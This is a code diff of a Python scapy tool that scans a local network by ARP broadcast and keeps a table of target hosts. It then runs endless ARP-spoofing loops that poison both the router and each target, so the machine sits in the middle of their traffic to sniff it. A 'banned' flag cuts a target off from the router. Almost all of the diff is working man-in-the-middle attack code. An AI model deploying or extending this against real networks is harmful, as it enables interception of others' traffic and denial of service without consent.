@@ -8,6 +8,20 @@ from scapy.packet import Packet
 from scapy.sendrecv import sendp, srp, sniff
 
 
+class Target:
+    def __init__(self, ip: str, mac: str):
+        self.ip = ip
+        self.mac = mac
+        self.monitor = True
+        self.banned = False
+
+    def __str__(self):
+        return self.ip + ' at ' + self.mac
+
+    def __repr__(self):
+        return self.ip
+
+
 class Sniffer:
     def __init__(self, iff=conf.iface):
         """
@@ -22,34 +36,28 @@ class Sniffer:
         print("local ip  :", self.local_ip)
         print("router mac:", self.router_mac)
         print("router ip :", self.router_ip)
-        self.arp_table = dict()
-        self.targets = set()
+        self.targets = dict()
 
     def scan(self, net_addr: str):
         """
         Scan LAN, discover sniffable hosts
         :param net_addr: network address `x.x.x.x/x`
         """
-        req = l2.Ether(dst='ff:ff:ff:ff:ff:ff') / l2.ARP(pdst=net_addr)
-        ress = srp(req, timeout=1, verbose=False)[0]
-        for res in ress:
-            if res[1].psrc not in [self.router_ip, self.local_ip]:
-                self.arp_table[res[1].psrc] = res[1].hwsrc
+        self.targets.clear()
+        while len(self.targets) == 0:
+            req = l2.Ether(dst='ff:ff:ff:ff:ff:ff') / l2.ARP(pdst=net_addr)
+            ress = srp(req, timeout=2, verbose=False)[0]
+            for res in ress:
+                ip = res[1].psrc
+                mac = res[1].hwsrc
+                if res[1].psrc not in [self.router_ip, self.local_ip]:
+                    self.targets[ip] = Target(ip, mac)
+            time.sleep(3)
 
-    def add(self, target_ip: str):
-        """
-        Add an target to sniff
-        :param target_ip: target host ip
-        """
-        if target_ip in self.arp_table:
-            self.targets.add(target_ip)
-
-    def remove(self, target_ip: str):
-        """
-        Remove the target
-        :param target_ip: target host ip
-        """
-        self.targets.remove(target_ip)
+    def add(self, ip: str):
+        mac = l2.getmacbyip(ip)
+        if mac is not None:
+            self.targets[ip] = Target(ip, mac)
 
     def start(self, on_recv: callable):
         """
@@ -65,21 +73,25 @@ class Sniffer:
         """
         ARP spoof router
         """
-        for target_ip in self.targets:
-            p = l2.Ether(dst=self.router_mac) / \
-                l2.ARP(op=2, psrc=target_ip, pdst=self.router_ip, hwsrc=self.local_mac)
-            sendp(p, verbose=False)
-        time.sleep(1)
+        while True:
+            for target in self.targets.values():
+                if target.monitor and not target.banned:
+                    p = l2.Ether(dst=self.router_mac) / \
+                        l2.ARP(op=2, psrc=target.ip, pdst=self.router_ip, hwsrc=self.local_mac)
+                    sendp(p, verbose=False)
+            time.sleep(2)
 
     def _spoof_targets(self):
         """
         ARP spoof targets
         """
-        for target_ip in self.targets:
-            p = l2.Ether(dst=self.arp_table[target_ip]) / \
-                l2.ARP(op=2, psrc=self.router_ip, pdst=target_ip, hwsrc=self.local_mac)
-            sendp(p, verbose=False)
-        time.sleep(1)
+        while True:
+            for target in self.targets.values():
+                if target.monitor:
+                    p = l2.Ether(dst=target.mac) / \
+                        l2.ARP(op=2, psrc=self.router_ip, pdst=target.ip, hwsrc=self.local_mac)
+                    sendp(p, verbose=False)
+            time.sleep(2)
 
     def _filter(self, p: Packet):
         """
